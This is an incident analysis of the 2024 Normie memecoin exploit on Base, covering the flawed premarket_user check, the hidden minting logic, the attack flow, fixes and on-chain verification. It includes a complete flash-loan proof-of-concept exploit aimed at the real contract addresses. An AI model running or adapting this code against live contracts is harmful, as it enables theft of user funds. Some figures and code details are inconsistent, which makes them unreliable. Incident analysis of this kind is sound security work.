# Normie — Unlimited Token Minting via premarket_user Business Logic Flaw Analysis

| Item | Details |
|------|------|
| **Date** | 2024-05-26 |
| **Protocol** | Normie (NORMIE memecoin) |
| **Chain** | Base |
| **Loss** | ~$490,000 (224.98 ETH total drained, 77.5 ETH in this single Tx) |
| **Attacker** | [0xf7f3...717D](https://basescan.org/address/0xf7f3a556Ac21d081F6dBa961B6A84E52e37A717D) |
| **Attack Contract** | [0xEF0B...beFC](https://basescan.org/address/0xEF0BA56DA26B4DDFEf0959c1D0Fc7a73A908beFC) |
| **Attack Tx** | [0xa618...c3fd](https://basescan.org/tx/0xa618933a0e0ffd0b9f4f0835cc94e523d0941032821692c01aa96cd6f80fc3fd) |
| **Vulnerable Contract** | [0x7F12...AF200](https://basescan.org/address/0x7F12d13B34F5F4f0a9449c16Bcd42f0da47AF200) |
| **Fork Block** | 14,952,782 (Attack Block: 14,952,783) |
| **Root Cause** | `_get_premarket_user()` flawed authorization logic → conditional unlimited minting triggered inside `_transfer()` |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/NORMIE_exp.sol) |

---

## 1. Vulnerability Overview

Normie (NORMIE) was a memecoin operating on the Base chain, designed with a total supply of 1 billion tokens. However, inside the token contract's `_transfer()` function, there existed logic that **additionally credited the contract's own balance with the corresponding amount whenever a recipient holding the premarket_user role purchased (bought) tokens from the pair**. This hidden minting mechanism, combined with a **flawed role assignment condition** in the `_get_premarket_user()` function, allowed an attacker to arbitrarily obtain premarket_user privileges, then repeatedly call `skim()` to transfer the contract's accumulated balance to the pair, repeatedly triggering `swapAndLiquify` and thereby selling hundreds of millions of newly minted NORMIE tokens into the market.

**Core vulnerability combination:**
1. `_get_premarket_user()` — automatically registers `premarket_user` if the received amount equals the team wallet balance
2. Condition inside `_transfer()` — when a `premarket_user` recipient purchases from the pair (isMarketPair), the amount is additionally credited to the contract balance (effectively unlimited minting)
3. `swapAndLiquify()` — automatically swaps NORMIE for ETH and distributes to the team wallet when the contract balance exceeds a threshold
4. `skim()` — standard AMM function that sends the difference between the pair's actual balance and its reserve to the caller (can be triggered repeatedly)

---

## 2. Vulnerable Code Analysis

### 2.1 `_get_premarket_user()` — Flawed Role Assignment Logic (Core Vulnerability)

```solidity
// ❌ Vulnerable code — automatically registers premarket_user when received amount equals team wallet balance
function _get_premarket_user(address _address, uint256 amount) internal {
    premarket_user[_address] = !premarket_user[_address]
        ? (amount == balanceOf(teamWalletAddress))  // ❌ Simple amount comparison anyone can satisfy
        : premarket_user[_address];
}
```

**Problem**: The `premarket_user` role assignment condition uses only a simple comparison — "received amount == current team wallet balance." Since the team wallet balance is publicly queryable on-chain (5,000,000 NORMIE at the time of the attack), anyone who purchases or receives that exact amount immediately obtains powerful minting privileges. There is no admin check, signature verification, timelock, or any other access control.

```solidity
// ✅ Fixed code — explicit allowlist-based role assignment
mapping(address => bool) private premarket_user;

// Restrict premarket_user assignment to owner only
function setPremarketUser(address _address, bool _status) external onlyOwner {
    premarket_user[_address] = _status;
    emit PremarketUserUpdated(_address, _status);
}

// _get_premarket_user function completely removed or blocked from external calls
// This function is not called inside _transfer()
```

---

### 2.2 `_transfer()` — Conditional Minting Logic for premarket_user Recipients

```solidity
// ❌ Vulnerable code — hidden minting mechanism inside _transfer()
function _transfer(
    address sender,
    address recipient,
    uint256 amount
) private returns (bool) {
    // ...

    // ❌ When purchasing from pair (isMarketPair[sender]) + premarket_user[recipient] condition is met:
    // additionally accumulates amount in the contract's own balance (effectively minting)
    if (
        isMarketPair[sender] &&
        !isExcludedFromFee[recipient] &&
        premarket_user[recipient]       // ❌ Triggered using privileges obtained by attacker
    ) {
        _balances[address(this)] = _balances[address(this)].add(amount);
        // ❌ Added to contract without deducting from sender's balance — supply increases
    }

    // ❌ Automatically executes swapAndLiquify when contract balance exceeds threshold
    if (
        overMinimumTokenBalance &&
        !inSwapAndLiquify &&
        !isMarketPair[sender] &&
        swapAndLiquifyEnabled &&
        !isExcludedFromFee[sender]
    ) {
        swapAndLiquify(contractTokenBalance);  // ❌ Swaps accumulated tokens for ETH
    }

    // ...

    // ❌ Re-evaluates premarket_user after transfer — re-checks role assignment condition
    _get_premarket_user(recipient, amount);
    // ...
}
```

**Problem**: Every time a purchase transaction occurs, the purchase amount for a premarket_user-registered recipient is double-recorded in the contract balance. In addition to the actual token transfer (pair → recipient), the contract balance also increases, causing the total supply to effectively inflate.

```solidity
// ✅ Fixed code — completely removes the conditional minting block
function _transfer(
    address sender,
    address recipient,
    uint256 amount
) private returns (bool) {
    // ...

    // ✅ premarket_user-related minting block removed
    // Supply can only increase through an explicit mint() function

    // ✅ swapAndLiquify only processes tokens collected as fees
    if (
        overMinimumTokenBalance &&
        !inSwapAndLiquify &&
        !isMarketPair[sender] &&
        swapAndLiquifyEnabled
    ) {
        swapAndLiquify(contractTokenBalance);
    }

    _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
    uint256 finalAmount = (isExcludedFromFee[sender] || isExcludedFromFee[recipient])
        ? amount
        : takeFee(sender, recipient, amount);

    _balances[recipient] = _balances[recipient].add(finalAmount);
    // ✅ _get_premarket_user call removed
    emit Transfer(sender, recipient, finalAmount);
    return true;
}
```

---

### 2.3 `swapAndLiquify()` — Converting Contract Balance to ETH

```solidity
// Reference code — swapAndLiquify is not inherently vulnerable,
// but when combined with the minting logic, it becomes the attacker's profit-realization mechanism
function swapAndLiquify(uint256 tAmount) private lockTheSwap {
    uint256 tokensForLP = tAmount.mul(_liquidityShare).div(_totalDistributionShares).div(2);
    uint256 tokensForSwap = tAmount.sub(tokensForLP);
    swapTokensForEth(tokensForSwap);  // NORMIE → ETH swap
    uint256 amountReceived = address(this).balance;

    // Distribute ETH to team wallet, developer wallet, and liquidity pool
    if (amountReceived > 0) {
        transferToAddressETH(teamWalletAddress, amountBNBMarketing);
        transferToAddressETH(devWalletAddress, amountBNBTeam);
        addLiquidity(tokensForLP, amountBNBLiquidity);
    }
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Attacker queries the NORMIE balance of the team wallet (`0xd8056...bEb2`) on-chain: **5,000,000 NORMIE**
- Deploys attack contract (`0xEF0B...beFC`)
- Attacker EOA initial balance: **0.2415 ETH**

### 3.2 Execution Phase

**Step 1: Obtaining premarket_user Privileges**
- 2 ETH → purchase NORMIE via SushiSwap V2 Router (receives ~171,956 NORMIE)
- After `_transfer()`, `_get_premarket_user()` is called → received amount 171,956 ≠ 5,000,000, so not obtained
- **SLP Flash Loan 1**: Borrow 5,000,000 NORMIE → transfer to attack contract
- In `uniswapV2Call` callback, repay 5,020,000 NORMIE to SLP (including fee)
- During this process, attack contract receives 5,000,000 NORMIE from SLP (isMarketPair)
  → `_get_premarket_user()`: amount(5,000,000) == balanceOf(teamWallet)(5,000,000) ✓
  → **Attack contract successfully registered as `premarket_user`**

**Step 2: Triggering Uniswap V3 Flash Loan**
- Request 11,333,142 NORMIE flash loan from Uniswap V3 Pool
- Enter `uniswapV3FlashCallback` callback

**Step 3: Initial Large-Scale Dump + premarket_user Minting Trigger**
- Swap 9,066,513 NORMIE received from flash loan for WETH on SushiSwap V2
- When `_transfer(SLP → attack contract)` executes, premarket_user condition is met
  → `_balances[NORMIE_contract] += 9,066,513` (contract balance increases)
- 2,266,628 NORMIE remaining after swap

**Step 4: skim() Repeat Loop — Minting Amplification**
```
for (i = 0; i < 50; i++) {
    skim(address(this))        → Sends pair's actual balance - reserve difference to attack contract
    transfer(SLP, 2,266,628)   → Attack contract sends back to SLP (triggers premarket_user)
                                → _balances[NORMIE_contract] += 2,266,628 (accumulates repeatedly)
}
```
- After 50 iterations, contract balance exceeds `_minimumTokensBeforeSwap` threshold
- Each time threshold is exceeded, `swapAndLiquify()` executes automatically
  → Swaps accumulated 4,650,000 NORMIE for WETH (earning ~66–17 WETH each time)

**Step 5: Additional Purchase and Flash Loan Repayment**
- Purchase additional NORMIE with 2 ETH (maintains premarket_user status)
- Repay 11,446,473 NORMIE to Uniswap V3 Pool (flash loan repayment)
- Transfer remaining NORMIE to attacker

### 3.3 Attack Flow Diagram

```
┌─────────────────────────────────────────────────────────────────┐
│                     Attacker EOA (0xf7f3...)                    │
│                     Initial: 0.2415 ETH                         │
└────────────────────────┬────────────────────────────────────────┘
                         │ Purchase NORMIE with 2 ETH
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│              SushiSwap V2 Router (SushiRouterv2)                │
│              0x6BDED42c6DA8FBf0d2bA55B2fa120C5e0c8D7891         │
└────────────────────────┬────────────────────────────────────────┘
                         │ Receive 171,956 NORMIE
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│              Attack Contract (0xEF0B...beFC)                    │
│   STEP 1: Request SLP flash loan (5,000,000 NORMIE)             │
└────────────────────────┬────────────────────────────────────────┘
                         │ uniswapV2Call callback
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│              SLP (Sushi V2 Pair, 0x24605E0b...)                  │
│   SLP → Attack Contract: 5,000,000 NORMIE                       │
│   ┌──────────────────────────────────────────┐                  │
│   │ Inside _transfer()                        │                  │
│   │ _get_premarket_user(attackContract, 5M)   │                  │
│   │ → 5000000 == balanceOf(teamWallet) ✓     │                  │
│   │ → premarket_user[attackContract] = true ✓│                  │
│   └──────────────────────────────────────────┘                  │
│   Attack Contract → SLP: 5,020,000 NORMIE (repayment)           │
└────────────────────────┬────────────────────────────────────────┘
                         │ premarket_user privileges obtained
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│         Uniswap V3 Pool (0x67ab0E84...) Flash Loan              │
│         Borrow 11,333,142 NORMIE → Attack Contract              │
└────────────────────────┬────────────────────────────────────────┘
                         │ Enter uniswapV3FlashCallback
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│              Large Dump: 9,066,513 NORMIE → WETH                │
│   premarket_user condition met when SLP → Attack Contract (buy) │
│   → NORMIE contract balance += 9,066,513 (unauthorized minting) │
│   → Receive 66 WETH                                             │
└────────────────────────┬────────────────────────────────────────┘
                         │ 50-iteration repeat loop
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│                    skim() Repeat Loop (50x)                     │
│   ┌────────────────────────────────────────────────────┐        │
│   │  ①  SLP.skim(attackContract)                        │        │
│   │      → Receive pair surplus to attack contract      │        │
│   │  ②  Attack Contract → SLP: transfer 2,266,628 NORMIE│        │
│   │      → _transfer(): premarket_user condition met    │        │
│   │      → NORMIE contract balance += 2,266,628         │        │
│   │  ③  Contract balance > threshold → swapAndLiquify() │        │
│   │      → 4,650,000 NORMIE → ETH swap (repeated)       │        │
│   └────────────────────────────────────────────────────┘        │
│   Total NORMIE minted: ~237,150,000 NORMIE (51 cycles)          │
└────────────────────────┬────────────────────────────────────────┘
                         │ Flash loan repayment
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│         Uniswap V3 Pool repayment: 11,446,473 NORMIE            │
│         Uniswap V3 Pool → Attack Contract: 12 WETH (profit)     │
└────────────────────────┬────────────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────────────┐
│                     Final Result                                │
│  Attacker EOA balance: 77.7560 ETH (net profit: +77.5145 ETH)   │
│  Market cap: $41M → $35K (99% collapse)                         │
│  Total illegally minted NORMIE: ~237,150,000                    │
└─────────────────────────────────────────────────────────────────┘
```

### 3.3 Outcome

- **Attacker profit (this transaction)**: 77.5145 ETH (pre-attack: 0.2415 ETH → post-attack: 77.756 ETH)
- **Total attack series profit**: ~224.98 ETH (~$881,686 at ~$3,920/ETH)
- **Loss per PoC**: $490,000 (DeFiHackLabs official record)
- **NORMIE market cap collapse**: $41M → ~$35K (99% decline)
- **Illegally minted NORMIE**: ~237,150,000 in a single Tx (on-chain verified)
- **Supply inflation**: 1,000,000,000 → 65,000,000,000+ NORMIE

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost: $490K
// Attack Tx: https://app.blocksec.com/explorer/tx/base/0xa618933a...

contract ContractTest is Test {
    address SushiRouterv2 = 0x6BDED42c6DA8FBf0d2bA55B2fa120C5e0c8D7891;
    address SLP          = 0x24605E0bb933f6EC96E6bBbCEa0be8cC880F6E6f; // Sushi V2 Pair
    address UniswapV3Pool = 0x67ab0E84C7f9e399a67037F94a08e5C664DC1C66;
    address WETH         = 0x4200000000000000000000000000000000000006;
    address NORMIE       = 0x7F12d13B34F5F4f0a9449c16Bcd42f0da47AF200;

    function setUp() public {
        // Fork Base chain (just before attack block)
        vm.createSelectFork("base", 14_952_783 - 1);
        // Burn all ETH except 3 ETH in test environment (same conditions as actual attacker)
        uint256 excess = address(this).balance - 3 ether;
        payable(address(0)).call{value: excess}("");
    }

    function testExploit() public {
        // [Step 1] Purchase NORMIE with 2 ETH — premarket_user condition not yet met at this point
        address[] memory path1 = new address[](2);
        path1[0] = WETH;
        path1[1] = NORMIE;
        Uni_Router_V2(SushiRouterv2).swapExactETHForTokensSupportingFeeOnTransferTokens
            {value: 2 ether}(0, path1, address(this), block.timestamp);

        // [Step 2] SLP flash loan: borrow 5,000,000 NORMIE → handled in uniswapV2Call
        // Receiving 5,000,000 NORMIE triggers premarket_user registration in _get_premarket_user()
        IUniswapV2Pair(SLP).swap(0, 5_000_000_000_000_000, address(this), hex"01");

        // [Step 3] Uniswap V3 flash loan: borrow 11,333,142 NORMIE → large-scale attack in uniswapV3FlashCallback
        Uni_Pair_V3(UniswapV3Pool).flash(address(this), 0, 11_333_141_501_283_594, hex"");
    }

    // SLP flash loan callback — premarket_user privilege acquisition phase
    function uniswapV2Call(address, uint256, uint256, bytes calldata) external {
        // Send all received 5,000,000 NORMIE back to SLP
        // _transfer(SLP → this, 5000000) sets premarket_user[this] = true
        uint256 bal = IERC20(NORMIE).balanceOf(address(this));
        IERC20(NORMIE).transfer(SLP, bal); // Repay including fee
    }

    // Uniswap V3 flash loan callback — core attack logic
    function uniswapV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata) external {
        IERC20(NORMIE).approve(SushiRouterv2, type(uint256).max);

        // [Step 4] Swap 9,066,513 NORMIE → WETH (large dump)
        // During this process, when NORMIE is transferred SLP → this, premarket_user condition is met
        // → Accumulates 9,066,513 additionally in NORMIE contract balance (unauthorized minting)
        address[] memory path2 = new address[](2);
        path2[0] = NORMIE;
        path2[1] = WETH;
        Uni_Router_V2(SushiRouterv2).swapExactTokensForETHSupportingFeeOnTransferTokens(
            9_066_513_201_026_875, 0, path2, address(this), block.timestamp
        );

        uint256 remaining = IERC20(NORMIE).balanceOf(address(this));
        IERC20(NORMIE).transfer(SLP, remaining); // Transfer to SLP (prepare for next loop)

        // [Step 5] Repeat skim() 50 times — accumulate contract balance + repeatedly trigger swapAndLiquify
        for (uint256 i; i < 50; ++i) {
            IUniswapV2Pair(SLP).skim(address(this)); // Receive pair surplus
            IERC20(NORMIE).transfer(SLP, remaining); // Retransfer → triggers premarket_user minting
            // When threshold exceeded, swapAndLiquify() executes automatically → 4,650,000 NORMIE → ETH
        }
        IUniswapV2Pair(SLP).skim(address(this)); // One final additional call

        // [Step 6] Purchase additional NORMIE with 2 ETH (maintain premarket_user status)
        Uni_Router_V2(SushiRouterv2).swapExactETHForTokensSupportingFeeOnTransferTokens
            {value: 2 ether}(0, path2, address(this), block.timestamp);

        // [Step 7] Repay Uniswap V3 flash loan
        IERC20(NORMIE).transfer(UniswapV3Pool, 11_446_472_916_296_430);
    }

    receive() external payable {}
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | `_get_premarket_user()` — Flawed authorization logic | CRITICAL | CWE-284 (Improper Access Control) |
| V-02 | Conditional unauthorized token minting inside `_transfer()` | CRITICAL | CWE-841 (Improper Enforcement of Behavioral Workflow) |
| V-03 | `skim()` + `swapAndLiquify()` repeated triggering | HIGH | CWE-400 (Uncontrolled Resource Consumption) |
| V-04 | Predictable condition due to public exposure of team wallet balance | MEDIUM | CWE-200 (Exposure of Sensitive Information) |

### V-01: `_get_premarket_user()` — Flawed Authorization Logic
- **Description**: `premarket_user` privilege is automatically granted if the received amount matches the current team wallet balance. The team wallet balance is publicly queryable by anyone via `balanceOf(teamWalletAddress)`.
- **Impact**: Anyone who purchases or receives via flash loan an amount equal to the team wallet balance (5,000,000 NORMIE) immediately obtains unlimited minting privileges.
- **Attack Condition**: Receive tokens equal to the team wallet balance (5,000,000 NORMIE) in a single transfer. Can be satisfied with zero capital using a flash loan.

### V-02: Conditional Unauthorized Token Minting inside `_transfer()`
- **Description**: When a `premarket_user` recipient purchases tokens from the pair, the purchase amount is additionally credited to the contract's own balance (`_balances[address(this)]`). This is a hidden minting path not reflected in the total issued supply.
- **Impact**: Effective doubling of supply with each purchase transaction. When swapAndLiquify triggers, a large volume of newly minted tokens floods the market.
- **Attack Condition**: After obtaining premarket_user via V-01, executes automatically on every purchase from the pair.

### V-03: `skim()` + `swapAndLiquify()` Repeated Triggering
- **Description**: `skim()` is a standard AMM function that sends the difference between the pair's actual balance and its internal reserve to a specified address. By repeatedly sending tokens to the pair and calling skim(), the attacker continuously increases the contract balance, causing swapAndLiquify to execute repeatedly.
- **Impact**: 51 mint+swap cycles executed within a single transaction. ~237,150,000 NORMIE illegally minted.
- **Attack Condition**: After completing V-01 and V-02, with sufficient gas limit.

### V-04: Public Exposure of Team Wallet Balance
- **Description**: The core parameter of the attack condition (team wallet balance) is fully public on the blockchain, allowing the attacker to pre-calculate the exact attack condition.
- **Impact**: The security premise of authorization logic based on internal system state is fundamentally invalidated.

---

## 6. Remediation Recommendations

### Immediate Actions

```solidity
// ✅ Fix 1: Remove _get_premarket_user() function and replace with explicit admin configuration
// Delete the _get_premarket_user() call line inside _transfer()

// ✅ Fix 2: Remove conditional minting block inside _transfer()
// Delete the entire block below
/*
if (
    isMarketPair[sender] &&
    !isExcludedFromFee[recipient] &&
    premarket_user[recipient]
) {
    _balances[address(this)] = _balances[address(this)].add(amount);
}
*/

// ✅ Fix 3: Restrict premarket_user configuration to onlyOwner function only
function setPremarketUser(address _address, bool _status) external onlyOwner {
    require(_address != address(0), "Zero address");
    premarket_user[_address] = _status;
    emit PremarketUserUpdated(_address, _status);
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01 Flawed authorization | Use admin-only explicit allowlist. Prohibit automatic authorization based on on-chain state. |
| V-02 Hidden minting logic | Implement ERC-20 mint function explicitly and independently. Prohibit direct balance manipulation inside `_transfer()`. |
| V-03 Repeated triggering | Apply cooldown timelock per `swapAndLiquify` call. Limit maximum execution count per single Tx. |
| V-04 Predictable condition | Prohibit use of publicly readable on-chain data (balanceOf) in authorization conditions. Introduce off-chain signature-based verification. |
| General: Copy-paste risk | When using third-party template code, mandatory full audit of any added non-standard logic. |
| General: Automated functions | Apply maximum execution count and cooldown to auto-executing functions like `swapAndLiquify`. |

---

## 7. Lessons Learned

1. **Only pure balance transfer logic should be permitted inside `_transfer()`.** Hiding logic with side effects — such as authorization, minting, or external calls — inside `_transfer()` causes severe vulnerabilities. The ERC-20 standard expects `transfer` to purely move tokens from sender to recipient.

2. **On-chain public data must not be used as authorization conditions.** `balanceOf(someAddress)` can be queried by anyone and satisfied via flash loan. Authorization must be performed exclusively through off-chain signatures or explicit admin calls.

3. **Copy-pasted code can be more dangerous than the original.** The attacker noted in an on-chain message that this contract was "copy-paste work." Non-standard logic added to open-source templates must not be used without independent security audits.

4. **Memecoins must be held to the same security standards.** The perception of being a "simple meme project" does not justify skipping security audits. Real user funds can be put at risk.

5. **The possibility of repeated execution of the `swapAndLiquify` pattern must always be reviewed.** Automatic swap triggers can be repeatedly executed through external manipulation, leading to large-scale fund loss. Cooldown per execution and maximum execution count limits are essential.

6. **Pre-market features must be deactivated immediately after launch.** Privileged logic from the development/testing phase remaining in production contracts significantly expands the attack surface.

---

## 8. On-Chain Verification

### 8.1 PoC vs. On-Chain Amount Comparison

| Item | PoC Value | On-Chain Actual | Match |
|------|-----------|-------------|------|
| Flash Loan 1 (SLP) | 5,000,000,000,000,000 (5M × 1e9) | 5,000,000 NORMIE received (log[9]) | ✓ Match |
| Flash Loan 2 (UniV3) | 11,333,141,501,283,594 | 11,333,142 NORMIE (log[21]) | ✓ Match |
| Large dump amount | 9,066,513,201,026,875 | 9,066,513 NORMIE (log[25]) | ✓ Match |
| UniV3 repayment amount | 11,446,472,916,296,430 | 11,446,473 NORMIE (log[1394]) | ✓ Match |
| Iteration count | 50x + 1x | 50+1 skim() confirmed (log pattern) | ✓ Match |
| Total NORMIE minted (estimated) | N/A | 237,150,000 NORMIE (on-chain aggregate) | New |
| Attacker ETH profit (this Tx) | N/A | +77.5145 ETH (on-chain confirmed) | New |

### 8.2 Key On-Chain Event Log Sequence

```
[log 1]   WETH: SushiRouter → SLP (2 WETH deposited)
[log 4]   NORMIE: SLP → Attack Contract (171,956 NORMIE purchased)
[log 9]   NORMIE: SLP → Attack Contract (5,000,000 NORMIE flash loan) ← premarket_user registered
[log 12]  NORMIE: Attack Contract → SLP (20,000 NORMIE transferred)
[log 16]  NORMIE: SLP → Attack Contract (5,020,000 NORMIE repayment complete)
[log 21]  NORMIE: UniV3 → Attack Contract (11,333,142 NORMIE flash loan)
[log 25]  NORMIE: Attack Contract → SLP (9,066,513 NORMIE dump input)
[log 27]  WETH: SLP → SushiRouter (65.98 WETH received) ← large dump profit
[log 56]  NORMIE: NORMIE Contract → SLP (4,650,000 NORMIE) ← swapAndLiquify cycle 1
[log 83]  NORMIE: NORMIE Contract → SLP (4,650,000 NORMIE) ← swapAndLiquify cycle 2
...       (repeated 50+ times)
[log 1394] NORMIE: Attack Contract → UniV3 (11,446,473 NORMIE flash loan repayment)
[log 1412] WETH: UniV3 → Attack Contract (12 WETH received) ← final profit
```

### 8.3 Precondition Verification (as of Attack Block 14,952,782)

| Item | Pre-Attack State | Notes |
|------|------------|------|
| Team wallet NORMIE balance | **5,000,000 NORMIE** | Core value for premarket_user acquisition condition |
| Attacker EOA ETH | 0.2415 ETH | Sufficient balance for 2 ETH purchase |
| Attack contract premarket_user | false | Not registered before attack |
| SLP liquidity | Normal | Sufficient for flash loan |
| UniV3 Pool NORMIE | Sufficient | 11.3M NORMIE flash loan feasible |

---

**References:**
- [CertiK Normie Incident Analysis](https://www.certik.com/resources/blog/normie-incident-analysis)
- [Extropy.IO Block Forensics](https://extropy-io.medium.com/block-forensics-an-in-depth-analysis-of-the-normie-memecoin-incident-0daf5baed08b)
- [BaseScan Attack Tx](https://basescan.org/tx/0xa618933a0e0ffd0b9f4f0835cc94e523d0941032821692c01aa96cd6f80fc3fd)
- [DeFiHackLabs PoC](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/NORMIE_exp.sol)
- [Sourcify Verified Source](https://sourcify.dev/#/lookup/0x7F12d13B34F5F4f0a9449c16Bcd42f0da47AF200)